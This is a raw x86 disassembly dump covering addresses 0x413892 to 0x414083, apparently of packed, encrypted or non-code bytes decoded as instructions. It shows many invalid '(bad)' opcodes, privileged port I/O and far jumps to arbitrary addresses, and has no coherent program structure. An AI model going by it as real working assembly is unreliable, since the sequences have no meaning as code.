  413892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413893:	je     0x4138fe
  413895:	pushf  
  413896:	rol    BYTE PTR [ebx],0xa
  413899:	sbb    eax,0x8eb0f24a
  41389e:	idiv   DWORD PTR [ebp+0xd]
  4138a1:	in     al,0x3b
  4138a3:	leave  
  4138a4:	enter  0x43a2,0x83
  4138a8:	and    esp,DWORD PTR [ebx+0x1cdedd7e]
  4138ae:	mov    ebx,ebx
  4138b0:	push   es
  4138b1:	stc    
  4138b2:	test   al,0xe
  4138b4:	inc    esp
  4138b5:	out    dx,eax
  4138b6:	call   0xbcdb:0x122c7dc2
  4138bd:	leave  
  4138be:	jne    0x413929
  4138c0:	call   0x1f710e75
  4138c5:	inc    esi
  4138c6:	stos   BYTE PTR es:[edi],al
  4138c7:	jmp    DWORD PTR [ebx+0x37b18b63]
  4138cd:	ret    0xff70
  4138d0:	sub    esp,DWORD PTR [ecx+0x6e57687c]
  4138d6:	(bad)  
  4138d7:	mov    eax,0xbc47f3f0
  4138dc:	sub    ecx,DWORD PTR [esi+0x27fa7608]
  4138e2:	mov    ecx,0x43a93907
  4138e7:	ret    
  4138e8:	xor    ah,BYTE PTR [edx]
  4138ea:	mov    ch,0xcc
  4138ec:	sub    BYTE PTR [ebp+0x61],bh
  4138ef:	sbb    BYTE PTR [ecx-0x59],dl
  4138f2:	push   ebx
  4138f3:	daa    
  4138f4:	and    BYTE PTR [eax+0x6e841a3],ch
  4138fa:	icebp  
  4138fb:	mov    ch,0x14
  4138fd:	inc    edi
  4138fe:	loope  0x413912
  413900:	push   cs
  413901:	add    eax,0x578b7591
  413906:	jmp    0x82196bec
  41390b:	cmp    dl,BYTE PTR [eax+0x1ae51c8f]
  413911:	iret   
  413912:	inc    eax
  413913:	inc    eax
  413914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413915:	pop    esp
  413916:	inc    edx
  413917:	fwait
  413918:	pop    edi
  413919:	retf   0x7ee
  41391c:	xlat   BYTE PTR ds:[ebx]
  41391d:	(bad)  [eax+0x4dc63ef0]
  413923:	xlat   BYTE PTR ds:[ebx]
  413924:	push   cs
  413925:	mov    ecx,0x2eb3d561
  41392a:	xor    al,0x5
  41392c:	or     ecx,DWORD PTR [ecx+0x7d]
  41392f:	xor    al,0x19
  413931:	cmp    esp,DWORD PTR [ecx-0x5d2cbf4c]
  413937:	inc    esp
  413938:	dec    edx
  413939:	call   DWORD PTR [eiz*2+0x7b93e287]
  413940:	pop    edi
  413941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413942:	aas    
  413943:	test   eax,0xb79a2c4d
  413948:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41394a:	mov    edx,0x4e823a67
  41394f:	lahf   
  413950:	sub    ebx,eax
  413952:	lods   eax,DWORD PTR ds:[esi]
  413953:	jo     0x41396e
  413955:	mov    DWORD PTR [edi],esi
  413957:	xor    DWORD PTR [ebp-0x33befbb7],0x8b5fab9b
  413961:	mov    esi,0xbc6b0866
  413966:	retf   0xd07a
  413969:	mov    eax,0xc3abffd7
  41396e:	mov    ch,0x69
  413970:	cmc    
  413971:	mov    al,BYTE PTR [edi]
  413973:	aam    0x3c
  413975:	(bad)  
  413976:	xchg   edi,eax
  413977:	adc    ch,ch
  413979:	cmp    cl,al
  41397b:	cmc    
  41397c:	xchg   ebp,eax
  41397d:	outs   dx,BYTE PTR ds:[esi]
  41397e:	unpckhps xmm7,XMMWORD PTR [edx+eax*1]
  413982:	jp     0x4139e0
  413984:	pop    ds
  413985:	sbb    eax,0x92bde80d
  41398a:	cmp    edx,edi
  41398c:	push   ecx
  41398d:	retf   0x4fd1
  413990:	lds    eax,FWORD PTR [esi+0x10131e75]
  413996:	adc    esi,DWORD PTR [edi]
  413998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413999:	jns    0x4139ec
  41399b:	mov    ds:0x80c14d28,al
  4139a0:	popa   
  4139a1:	mov    bh,0xdb
  4139a3:	mov    al,ds:0x3da8aeb6
  4139a8:	jns    0x4139d2
  4139aa:	and    DWORD PTR [esi-0x7a9b17e2],ebp
  4139b0:	or     DWORD PTR [eax+0x14c86573],eax
  4139b6:	addr16 jno 0x413941
  4139b9:	adc    al,0xa1
  4139bb:	xor    eax,0x46e0a63e
  4139c0:	aaa    
  4139c1:	mov    ecx,0x5aad5498
  4139c6:	repz call 0x6211:0x35f767fc
  4139ce:	js     0x4139bc
  4139d0:	sub    edi,ebp
  4139d2:	into   
  4139d3:	xchg   edx,eax
  4139d4:	call   0xea41fc9c
  4139d9:	mov    cl,BYTE PTR [ecx+0x38]
  4139dc:	or     eax,0xad02f034
  4139e1:	mov    ecx,0xec72091f
  4139e6:	fmul   QWORD PTR [esi+0x419e651]
  4139ec:	jne    0x4139f1
  4139ee:	add    esp,DWORD PTR [esi]
  4139f0:	outs   dx,DWORD PTR ds:[esi]
  4139f1:	retf   
  4139f2:	sub    DWORD PTR [esp+ebx*1+0x1b],edx
  4139f6:	fst    QWORD PTR [edi]
  4139f8:	lahf   
  4139f9:	loop   0x41397f
  4139fb:	jmp    0x413a74
  4139fd:	mov    bh,0x55
  4139ff:	xor    DWORD PTR [esi],ecx
  413a01:	mov    eax,ds:0xba4d3f71
  413a06:	adc    al,0x55
  413a08:	add    ebp,edi
  413a0a:	lods   eax,DWORD PTR ds:[esi]
  413a0b:	inc    ebp
  413a0c:	dec    eax
  413a0d:	cli    
  413a0e:	or     eax,DWORD PTR [esi+0x686e1476]
  413a14:	add    al,ah
  413a16:	pop    edi
  413a17:	ja     0x413a76
  413a19:	lea    ebx,[esi+0x32]
  413a1c:	jae    0x4139e1
  413a1e:	pop    edi
  413a1f:	leave  
  413a20:	in     eax,0xb3
  413a22:	and    cl,BYTE PTR [edi]
  413a24:	dec    edx
  413a25:	pop    ss
  413a26:	pop    ds
  413a27:	nop
  413a28:	je     0x4139e8
  413a2a:	mov    al,ds:0xce33f269
  413a2f:	test   DWORD PTR [ebp-0x41],esi
  413a32:	retf   0xb47d
  413a35:	xor    eax,0x77005eff
  413a3a:	cmp    bl,BYTE PTR [ebp-0x2b93e784]
  413a40:	call   0x4275:0x7fd47930
  413a47:	int3   
  413a48:	or     DWORD PTR [edi-0x5fd0762d],edi
  413a4e:	retf   
  413a4f:	retf   0x1a6c
  413a52:	mov    ds:0xfedfd0e5,eax
  413a57:	in     al,0xfb
  413a59:	mov    dh,0x91
  413a5b:	add    eax,0x17d90f21
  413a60:	pop    edx
  413a61:	call   0xdf9c:0x43d94353
  413a68:	inc    ebx
  413a69:	mov    al,ds:0xb205eda7
  413a6e:	add    eax,0xe0f88a2f
  413a73:	mov    eax,ds:0xd395fdb3
  413a78:	inc    ebx
  413a79:	mov    dl,0xeb
  413a7b:	cmp    DWORD PTR [esi-0x19],esi
  413a7e:	and    eax,0xc3fc1cc0
  413a83:	(bad)  
  413a84:	icebp  
  413a85:	jecxz  0x413ad0
  413a87:	fld    st(2)
  413a89:	aad    0x77
  413a8b:	pop    esi
  413a8c:	jae    0x413ad9
  413a8e:	test   DWORD PTR [eax+edi*1],ebp
  413a91:	mov    ds:0x49191f1,eax
  413a96:	leave  
  413a97:	lea    esp,[edx-0xd57bf56]
  413a9d:	stos   DWORD PTR es:[edi],eax
  413a9e:	jle    0x413a56
  413aa0:	sub    ch,BYTE PTR [ebp-0x4e888cab]
  413aa6:	or     al,0x7c
  413aa8:	fdiv   DWORD PTR es:[ecx+0x2]
  413aac:	gs popf 
  413aae:	sbb    al,0xc4
  413ab0:	sti    
  413ab1:	and    BYTE PTR [edi+0x3c3e7d5e],0x23
  413ab8:	lock in eax,dx
  413aba:	xchg   DWORD PTR [esp+edi*4-0x4557cab6],ebx
  413ac1:	das    
  413ac2:	fisttp WORD PTR [ebx]
  413ac4:	xor    eax,0x104d4bb2
  413ac9:	js     0x413adb
  413acb:	adc    eax,0x2421a8b
  413ad0:	shl    BYTE PTR [edi],cl
  413ad2:	and    dl,BYTE PTR [ebp+ebp*8-0x196a9aa4]
  413ad9:	inc    eax
  413ada:	stos   BYTE PTR es:[edi],al
  413adb:	adc    BYTE PTR fs:[edx+eax*2+0x21684de9],0xc
  413ae4:	in     eax,dx
  413ae5:	mov    eax,DWORD PTR [esp+ebx*2-0x46d9970f]
  413aec:	push   esp
  413aed:	outs   dx,BYTE PTR ds:[esi]
  413aee:	nop
  413aef:	inc    edx
  413af0:	sbb    dl,dl
  413af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af3:	mov    esi,cs
  413af5:	or     al,BYTE PTR [esi]
  413af7:	and    al,0x4b
  413af9:	ins    BYTE PTR es:[edi],dx
  413afa:	sti    
  413afb:	cmp    al,0x1d
  413afd:	sbb    BYTE PTR [esi+0x3],al
  413b00:	data16 fwait
  413b02:	dec    si
  413b04:	call   0x3ab6:0x2ee9a82
  413b0b:	popf   
  413b0c:	or     esp,DWORD PTR [esi]
  413b0e:	bound  esi,QWORD PTR [esi-0x40ca54a5]
  413b14:	xlat   BYTE PTR ds:[ebx]
  413b15:	push   eax
  413b16:	repz in eax,0x37
  413b19:	out    0x7e,al
  413b1b:	sbb    ebp,ecx
  413b1d:	gs mov ah,0x36
  413b20:	add    edi,DWORD PTR [esp+eax*2-0x35]
  413b24:	js     0x413ab5
  413b26:	jge    0x413ac9
  413b28:	sbb    BYTE PTR [eax+edx*4+0x57],al
  413b2c:	jge    0x413af9
  413b2e:	push   0x6ca912ac
  413b33:	sub    eax,0x4acddacc
  413b38:	in     al,0x19
  413b3a:	outs   dx,DWORD PTR ds:[esi]
  413b3b:	call   0xc4dd:0x219f6fbb
  413b42:	xlat   BYTE PTR ds:[ebx]
  413b43:	popa   
  413b44:	int3   
  413b45:	arpl   WORD PTR [ebx+0x47],di
  413b48:	cmp    al,0x81
  413b4a:	mov    ebx,0x33f07bb4
  413b4f:	dec    edi
  413b50:	test   DWORD PTR [edi+0x45e8bfb4],0x5f309c77
  413b5a:	(bad)  
  413b5c:	sub    dh,dl
  413b5e:	sub    esi,eax
  413b60:	dec    esi
  413b61:	adc    esp,DWORD PTR [edi]
  413b63:	xchg   esp,eax
  413b64:	jecxz  0x413b8a
  413b66:	and    dl,ch
  413b68:	popa   
  413b69:	jns    0x413af0
  413b6b:	push   0xfacc23b5
  413b70:	adc    ebp,esi
  413b72:	iret   
  413b73:	mov    BYTE PTR [eax],bl
  413b75:	outs   dx,DWORD PTR ds:[esi]
  413b76:	xor    BYTE PTR [ebx-0xcb22800],0x4b
  413b7d:	add    DWORD PTR [edi-0x73],esi
  413b80:	fsubr  DWORD PTR [edx+0xe]
  413b83:	push   eax
  413b84:	lods   al,BYTE PTR ds:[esi]
  413b85:	test   BYTE PTR [eax+edx*1+0x7a678d0b],0x40
  413b8d:	popf   
  413b8e:	mov    cl,0xee
  413b90:	sbb    eax,0xec6958a1
  413b95:	mov    bh,BYTE PTR [ebp-0x62ca513b]
  413b9b:	jno    0x413bce
  413b9d:	mov    DWORD PTR [ecx+edx*1+0x20],edi
  413ba1:	(bad)  
  413ba3:	sbb    cl,BYTE PTR [edx-0x7b]
  413ba6:	lds    edi,FWORD PTR [esi]
  413ba8:	fsubr  QWORD PTR [edi+0x45]
  413bab:	mov    dl,0xda
  413bad:	xor    eax,0x3fcbdf29
  413bb2:	or     eax,0x57df96a1
  413bb7:	pop    ss
  413bb8:	mov    ebx,0x678a04a9
  413bbd:	in     al,0x8
  413bbf:	gs aad 0x22
  413bc2:	or     esi,DWORD PTR [edx+0x317d755b]
  413bc8:	mov    ch,0xa8
  413bca:	jno    0x413c1a
  413bcc:	xchg   esp,eax
  413bcd:	(bad)  
  413bce:	cwde   
  413bcf:	cmp    ebx,0xf5a10ba9
  413bd5:	mov    ah,cl
  413bd7:	mov    al,ds:0x8915e254
  413bdc:	mov    bh,0x51
  413bde:	jp     0x413c38
  413be0:	sub    eax,0xff2e40d0
  413be5:	inc    ebx
  413be6:	pop    edi
  413be7:	mov    ecx,0xe5891598
  413bec:	ins    BYTE PTR es:[edi],dx
  413bed:	inc    ecx
  413bee:	into   
  413bef:	inc    edi
  413bf0:	jmp    0x235c:0xd637422a
  413bf7:	test   al,0xc7
  413bf9:	mov    dh,0xf6
  413bfb:	test   ah,ch
  413bfd:	inc    esi
  413bfe:	mov    DWORD PTR [edx-0x5674f45a],eax
  413c04:	shr    DWORD PTR [edi-0x587dd1b4],1
  413c0a:	mov    bl,BYTE PTR [esi-0x519748dd]
  413c10:	iret   
  413c11:	jge    0x413ba3
  413c13:	cmp    dh,dh
  413c15:	and    esi,ecx
  413c17:	add    DWORD PTR [eax-0x304ce2b0],0x3e
  413c1e:	xor    bh,BYTE PTR [esi]
  413c20:	ins    DWORD PTR es:[edi],dx
  413c21:	out    dx,eax
  413c22:	das    
  413c23:	rcl    bh,cl
  413c25:	or     al,0x5
  413c27:	pop    ds
  413c28:	frstor [eax+0x763035d9]
  413c2e:	sbb    bh,ch
  413c30:	arpl   WORD PTR ss:[esi+0x17],di
  413c34:	sar    eax,0xd4
  413c37:	sub    edx,DWORD PTR [edi]
  413c39:	jbe    0x413be2
  413c3b:	dec    esi
  413c3c:	lods   eax,DWORD PTR ds:[esi]
  413c3d:	imul   eax,eax,0xffffffef
  413c40:	cli    
  413c41:	xor    eax,0x8d1c2459
  413c46:	adc    eax,0x5144b7a8
  413c4b:	retf   0x6ea6
  413c4e:	dec    ebx
  413c4f:	jno    0x413bf5
  413c51:	jmp    0x77d28106
  413c56:	or     eax,0x2a3b46f4
  413c5b:	call   0x998ab278
  413c60:	daa    
  413c61:	aam    0xa4
  413c63:	jmp    0x413cb9
  413c65:	bound  edi,QWORD PTR [ecx+0x22]
  413c68:	imul   ecx,DWORD PTR [esi+0x73],0x374f2bce
  413c6f:	mov    ebp,DWORD PTR [ebp-0x386dca6d]
  413c75:	mov    ch,0x5
  413c77:	inc    eax
  413c78:	ss stos BYTE PTR es:[edi],al
  413c7a:	or     eax,0x4ce13c84
  413c7f:	test   BYTE PTR [ebp+0x7c],al
  413c82:	mov    ds:0x5a528871,al
  413c87:	fistp  DWORD PTR [ecx-0x7e993333]
  413c8d:	add    BYTE PTR [ebx+0x491ed336],bl
  413c93:	cmp    ch,dl
  413c95:	cmp    DWORD PTR [edx],edi
  413c97:	fstp   DWORD PTR [esi+0x4f41df1a]
  413c9d:	or     esi,edi
  413c9f:	sbb    ecx,edi
  413ca1:	xchg   ebp,eax
  413ca2:	inc    eax
  413ca3:	std    
  413ca4:	adc    eax,0xc635a6d2
  413ca9:	popa   
  413caa:	sbb    esp,DWORD PTR [ebx+0xa963a86]
  413cb0:	and    BYTE PTR [ecx-0x2963854f],bl
  413cb6:	sub    edi,DWORD PTR [edx-0x32]
  413cb9:	ja     0x413cc3
  413cbb:	rcl    BYTE PTR [eax-0x2e3a3005],cl
  413cc1:	fstp   TBYTE PTR [ebx+0x3480cfe7]
  413cc7:	and    eax,0x80a487ae
  413ccc:	add    BYTE PTR [esp+esi*8],dl
  413ccf:	and    dl,al
  413cd1:	in     al,dx
  413cd2:	jbe    0x413ce8
  413cd4:	ins    DWORD PTR es:[edi],dx
  413cd5:	xchg   edi,eax
  413cd6:	pop    ecx
  413cd7:	fidiv  DWORD PTR [esi]
  413cd9:	lods   al,BYTE PTR ds:[esi]
  413cda:	sbb    al,0xb0
  413cdc:	sub    BYTE PTR [edx+0x35e159dd],ah
  413ce2:	cmp    al,0x30
  413ce4:	cmp    ebp,DWORD PTR [esi-0x74]
  413ce7:	xor    ch,BYTE PTR [ebx-0x24384804]
  413ced:	imul   ecx,DWORD PTR [ecx],0xffffffc0
  413cf0:	popf   
  413cf1:	adc    BYTE PTR [ebx+0x43],dl
  413cf4:	push   ecx
  413cf5:	xchg   edi,eax
  413cf6:	inc    ebp
  413cf7:	in     eax,dx
  413cf8:	sbb    edx,0xe302536d
  413cfe:	stos   DWORD PTR es:[edi],eax
  413cff:	and    eax,0xd1c67c4a
  413d04:	pop    es
  413d05:	ret    
  413d06:	pop    ecx
  413d07:	pop    eax
  413d08:	sbb    bl,BYTE PTR [ebp-0x53]
  413d0b:	jge    0x413d2b
  413d0d:	in     al,0xaa
  413d0f:	fcmovnu st,st(3)
  413d11:	jl     0x413d51
  413d13:	mov    bh,0xd
  413d15:	push   ss
  413d16:	or     DWORD PTR [esi],edx
  413d18:	scas   eax,DWORD PTR es:[edi]
  413d19:	out    0xdb,al
  413d1b:	(bad)  
  413d1c:	sti    
  413d1d:	mov    esi,0xb0eb785f
  413d22:	fimul  WORD PTR [edx]
  413d24:	aas    
  413d25:	xor    edx,DWORD PTR [esi+0x68]
  413d28:	lods   eax,DWORD PTR ds:[esi]
  413d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d2a:	jne    0x413d77
  413d2c:	popf   
  413d2d:	xchg   esp,eax
  413d2e:	inc    esp
  413d2f:	mov    ch,0x6a
  413d31:	cmp    eax,0xd08f7a74
  413d36:	mov    ah,0x1f
  413d38:	sub    bh,BYTE PTR [esi+0x35c1ecc6]
  413d3e:	scas   eax,DWORD PTR es:[edi]
  413d3f:	mov    ds:0xab0878c1,eax
  413d44:	dec    eax
  413d45:	xlat   BYTE PTR ds:[ebx]
  413d46:	hlt    
  413d47:	or     al,0xd8
  413d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d4a:	imul   ebx,DWORD PTR [edx-0x7b],0x6f7d8e06
  413d51:	jb     0x413d0b
  413d53:	fwait
  413d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d55:	or     dl,BYTE PTR [edx+eiz*8+0x7fbbcb3b]
  413d5c:	shl    edi,1
  413d5e:	push   cs
  413d5f:	inc    ebx
  413d60:	sbb    dh,BYTE PTR [esi-0x80]
  413d63:	fmul   DWORD PTR [ecx+0x40a1884e]
  413d69:	mov    cl,0xa2
  413d6b:	adc    eax,0x78defcf8
  413d70:	inc    esi
  413d71:	xchg   ecx,eax
  413d72:	cmc    
  413d73:	or     BYTE PTR [ecx+0x9],bh
  413d76:	push   cs
  413d77:	pop    ebp
  413d78:	mov    cl,0x28
  413d7a:	dec    edx
  413d7b:	pop    edx
  413d7c:	and    eax,0xd24fbc95
  413d81:	sahf   
  413d82:	ror    BYTE PTR [edx+0x758631e9],0x27
  413d89:	sbb    al,0x27
  413d8b:	add    DWORD PTR [esi+0xdf472b1],esi
  413d91:	(bad)  
  413d93:	scas   eax,DWORD PTR es:[edi]
  413d94:	mov    eax,ds:0x6ab93429
  413d99:	add    ah,BYTE PTR [eax]
  413d9b:	call   0x531d:0x96ae456e
  413da2:	jmp    0x2844:0x10c85fb8
  413da9:	cld    
  413daa:	sbb    ebx,DWORD PTR [ebx-0x43c898e9]
  413db0:	add    DWORD PTR [ecx+edx*8-0x757fe4d6],esp
  413db7:	daa    
  413db8:	xchg   DWORD PTR [eax],ecx
  413dba:	and    eax,0xa754d6c4
  413dbf:	adc    eax,0x74dd7fe6
  413dc4:	sub    al,0x0
  413dc6:	scas   al,BYTE PTR es:[edi]
  413dc7:	fld    TBYTE PTR [edi]
  413dc9:	push   ebp
  413dca:	pop    es
  413dcb:	ror    DWORD PTR [esi-0x53],1
  413dce:	punpckhbw mm0,QWORD PTR [edx+0x319a8ef9]
  413dd5:	dec    ebx
  413dd6:	aam    0x96
  413dd8:	xchg   edx,eax
  413dd9:	ins    DWORD PTR es:[edi],dx
  413dda:	test   al,0x43
  413ddc:	repz out dx,eax
  413dde:	and    al,0x83
  413de0:	mov    al,ds:0xe99ae799
  413de5:	(bad)  
  413de6:	adc    al,0x96
  413de8:	push   edx
  413de9:	js     0x413e65
  413deb:	pop    ebp
  413dec:	or     eax,0x7922d7b1
  413df1:	pop    esi
  413df2:	pop    ss
  413df3:	shl    edi,0x85
  413df6:	sbb    ah,al
  413df8:	out    0x54,al
  413dfa:	fcmovnu st,st(2)
  413dfc:	ret    
  413dfd:	push   0xce51c8e8
  413e02:	pusha  
  413e03:	pop    ebx
  413e04:	iret   
  413e05:	sbb    BYTE PTR [esi],bh
  413e07:	cwde   
  413e08:	stc    
  413e09:	add    edx,DWORD PTR [esi]
  413e0b:	ret    0x5abb
  413e0e:	jbe    0x413e7f
  413e10:	sbb    al,0xcd
  413e12:	push   ebp
  413e13:	les    ebx,FWORD PTR [ebp+0x1fe11d54]
  413e19:	mov    dl,BYTE PTR [edx]
  413e1b:	aam    0x9e
  413e1d:	mov    ds:0xec005003,al
  413e22:	inc    ebx
  413e23:	fisub  WORD PTR [esi+ebx*2]
  413e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e27:	ret    0x5a64
  413e2a:	call   0x1e8bf7f9
  413e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e30:	pop    ebx
  413e31:	xchg   esp,eax
  413e32:	mov    esp,0x484e309d
  413e37:	test   DWORD PTR [ebp-0x5e5d7aa4],edx
  413e3d:	jmp    0x413e97
  413e3f:	cmp    edi,DWORD PTR [eax]
  413e41:	jns    0x413e49
  413e43:	and    eax,0x345c011d
  413e48:	sti    
  413e49:	add    eax,0xab28c418
  413e4e:	lods   al,BYTE PTR ds:[esi]
  413e4f:	cmp    BYTE PTR [edx],al
  413e51:	adc    DWORD PTR [ebx],edi
  413e53:	jno    0x413e66
  413e55:	(bad)  
  413e56:	repnz inc ebp
  413e58:	cmp    edi,ecx
  413e5a:	js     0x413e2a
  413e5c:	and    DWORD PTR [edi-0x1c],ebx
  413e5f:	sbb    eax,0x80d1c6ba
  413e64:	mov    ds:0xf346be58,eax
  413e69:	ins    DWORD PTR es:[edi],dx
  413e6a:	mov    dh,0x69
  413e6c:	dec    edx
  413e6d:	sbb    ebp,DWORD PTR [edi+0x72]
  413e70:	sub    dl,al
  413e72:	popf   
  413e73:	pop    es
  413e74:	and    ah,BYTE PTR [ecx-0xcc6add0]
  413e7a:	cld    
  413e7b:	mov    bh,0x87
  413e7d:	add    DWORD PTR [edi-0x7afa77b7],esp
  413e83:	stos   DWORD PTR es:[edi],eax
  413e84:	cmp    eax,0x4d2963ea
  413e89:	test   BYTE PTR [edi],dl
  413e8b:	cmp    esi,DWORD PTR [ebx+0x7440585e]
  413e91:	sbb    ah,BYTE PTR [ecx+0x5c86a05c]
  413e97:	aad    0x3
  413e99:	sbb    DWORD PTR [ecx],edi
  413e9b:	std    
  413e9c:	jne    0x413e89
  413e9e:	pop    ss
  413e9f:	jmp    0xdd69:0x34e118bd
  413ea6:	adc    dh,cl
  413ea8:	cmp    ch,ch
  413eaa:	mov    ah,al
  413eac:	cmp    BYTE PTR [edx],dh
  413eae:	jmp    0x2616619b
  413eb3:	mov    eax,ds:0x130aed8a
  413eb8:	fwait
  413eb9:	ja     0x413e40
  413ebb:	aaa    
  413ebc:	sbb    cl,BYTE PTR [ecx]
  413ebe:	add    DWORD PTR [esp+esi*1-0x16ae7210],ebp
  413ec5:	in     al,0x35
  413ec7:	fsub   QWORD PTR [eax-0x2d]
  413eca:	or     bl,bh
  413ecc:	xchg   ebp,eax
  413ecd:	rol    DWORD PTR [ebx+esi*4],1
  413ed0:	arpl   cx,ax
  413ed2:	adc    cl,bh
  413ed4:	mov    DWORD PTR [ebx+0x72e2b08c],ecx
  413eda:	sar    DWORD PTR [eax+0x4f],1
  413edd:	sti    
  413ede:	adc    DWORD PTR [edx+edx*2-0x40],esp
  413ee2:	mov    ch,0x91
  413ee4:	(bad)
  413ee8:	xor    eax,0x5f3d8f1b
  413eed:	ss or  edx,esi
  413ef0:	in     al,dx
  413ef1:	ds push eax
  413ef3:	fwait
  413ef4:	mov    BYTE PTR [edx+0x3227eb25],bl
  413efa:	inc    edi
  413efb:	and    BYTE PTR [ecx+ebx*2],cl
  413efe:	dec    esi
  413eff:	xchg   esp,eax
  413f00:	mov    ah,0x6f
  413f02:	in     eax,0xdd
  413f04:	fdivr  st,st(4)
  413f06:	out    0x6d,al
  413f08:	lock inc ebx
  413f0a:	mov    eax,ds:0xe68aa0df
  413f0f:	mov    al,ds:0xc6fda246
  413f14:	adc    DWORD PTR [edi],ebx
  413f16:	push   edx
  413f17:	jne    0x413f96
  413f19:	mov    ecx,0xb8875657
  413f1e:	repz adc ecx,DWORD PTR [ecx]
  413f21:	mov    fs,WORD PTR [edi-0x7f]
  413f24:	sub    eax,0x3ab54488
  413f29:	cs dec edi
  413f2b:	and    BYTE PTR [eax-0x5d68cecc],0x62
  413f32:	pop    edx
  413f33:	push   ebp
  413f34:	iret   
  413f35:	and    cl,BYTE PTR [edi-0x745a70a3]
  413f3b:	sub    eax,0xc1a03251
  413f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f41:	mov    ecx,0x534b6bfc
  413f46:	(bad)  
  413f47:	xchg   esi,eax
  413f48:	fdiv   DWORD PTR [ecx-0x40]
  413f4b:	pop    eax
  413f4c:	sbb    eax,0x7655660f
  413f51:	inc    edx
  413f52:	icebp  
  413f53:	outs   dx,BYTE PTR ds:[esi]
  413f54:	sub    bh,BYTE PTR [edx-0x2f]
  413f57:	aam    0x3
  413f59:	js     0x413f95
  413f5b:	push   ss
  413f5c:	out    0x2d,al
  413f5e:	les    edi,FWORD PTR [ebp-0x62481d1c]
  413f64:	inc    ebp
  413f65:	push   esp
  413f66:	bound  esi,QWORD PTR [edi-0x67]
  413f69:	jge    0x413f98
  413f6b:	or     ch,al
  413f6d:	inc    ecx
  413f6e:	loopne 0x413fe1
  413f70:	mov    WORD PTR [eax+0x5e],ds
  413f73:	dec    ecx
  413f74:	shl    BYTE PTR [edi-0xabbfff],0x82
  413f7b:	cli    
  413f7c:	ja     0x413f4b
  413f7e:	fwait
  413f7f:	pusha  
  413f80:	ret    
  413f81:	mov    ebp,0xeabec6d9
  413f86:	cmp    esp,ecx
  413f88:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413f8a:	sbb    eax,DWORD PTR [ebx-0x48]
  413f8d:	push   cs
  413f8e:	push   ss
  413f8f:	mov    bh,0x9d
  413f91:	dec    ebx
  413f92:	lea    esp,[edx]
  413f94:	xchg   BYTE PTR [eax],dh
  413f96:	daa    
  413f97:	sahf   
  413f98:	pop    eax
  413f99:	add    al,0x6
  413f9b:	xchg   edi,eax
  413f9c:	jmp    DWORD PTR [esi]
  413f9e:	pop    esp
  413f9f:	mov    esi,0x58134579
  413fa4:	div    DWORD PTR ds:0x12b95648
  413faa:	fidiv  DWORD PTR [ecx]
  413fac:	jae    0x413fa4
  413fae:	aaa    
  413faf:	mov    ch,0x8a
  413fb1:	xor    BYTE PTR [ebx],dl
  413fb3:	scas   al,BYTE PTR es:[edi]
  413fb4:	pop    eax
  413fb5:	fcom   QWORD PTR [edi+0x2a]
  413fb8:	pop    es
  413fb9:	xor    eax,0x46866e28
  413fbe:	adc    ecx,DWORD PTR [ecx-0x64f7ea7b]
  413fc4:	jmp    0x332d:0xab94e893
  413fcb:	or     al,0x40
  413fcd:	ret    
  413fce:	(bad)  
  413fcf:	stos   DWORD PTR es:[edi],eax
  413fd0:	adc    edx,DWORD PTR [esi]
  413fd2:	mov    dl,BYTE PTR [ebp+0x28]
  413fd5:	mov    ds:0xbb5428d3,al
  413fda:	or     DWORD PTR [edi-0x34],ecx
  413fdd:	clc    
  413fde:	cmp    DWORD PTR [ebp+0x7968d70a],ecx
  413fe4:	and    al,0xde
  413fe6:	lahf   
  413fe7:	inc    eax
  413fe8:	aad    0x8b
  413fea:	mov    al,ds:0x220bd19d
  413fef:	jo     0x413f80
  413ff1:	vpmacssdql ymm5,ymm6,YMMWORD PTR [ecx],ymm0
  413ff7:	aaa    
  413ff8:	or     eax,DWORD PTR [ebp+0x65]
  413ffb:	sub    ebp,DWORD PTR [edx+0x12]
  413ffe:	aaa    
  413fff:	push   ebp
  414000:	iret   
  414001:	and    DWORD PTR [ebp+0x7c8cdf12],0xffffffc5
  414008:	aad    0xae
  41400a:	pop    ebp
  41400b:	push   ecx
  41400c:	cmovge ebp,eax
  41400f:	ds dec eax
  414011:	mov    ch,0xec
  414013:	xchg   edx,eax
  414014:	pop    ebx
  414015:	rol    bl,0xf
  414018:	xor    edx,DWORD PTR [eax-0x34]
  41401b:	scas   al,BYTE PTR es:[edi]
  41401c:	inc    ebx
  41401d:	ret    
  41401e:	or     DWORD PTR ds:0xe8397b35,0x15
  414025:	xor    ch,al
  414027:	out    0x38,eax
  414029:	jmp    0xabb3:0x44534f8
  414030:	arpl   WORD PTR [edi+0x79],dx
  414033:	adc    cl,BYTE PTR [edi-0xb884ad5]
  414039:	sub    ebp,DWORD PTR [ebp-0x9541f38]
  41403f:	jmp    0xf1135f4f
  414044:	sbb    BYTE PTR [ebx],ah
  414046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414047:	mov    al,ds:0xc00def78
  41404c:	inc    edx
  41404d:	retf   
  41404e:	sub    BYTE PTR [ecx-0x352d5c34],bl
  414054:	add    BYTE PTR [ecx],cl
  414056:	cli    
  414057:	sbb    al,0x85
  414059:	pop    edx
  41405a:	xor    dl,BYTE PTR [ecx-0x6bbdfa0]
  414060:	je     0x4140b0
  414062:	xchg   ebx,eax
  414063:	inc    eax
  414064:	rcl    DWORD PTR ds:0x9f045868,0x9a
  41406b:	shl    BYTE PTR [ebx-0x7ca917f2],cl
  414071:	mov    ah,0xfd
  414073:	(bad)  
  414074:	loop   0x41407f
  414076:	out    0x35,eax
  414078:	aas    
  414079:	out    0xc6,al
  41407b:	out    0x5e,eax
  41407d:	ins    BYTE PTR es:[edi],dx
  41407e:	ret    
  41407f:	test   al,0x14
  414081:	out    0xe0,eax
  414083:	sar    DWORD PTR [edx-0x79],cl
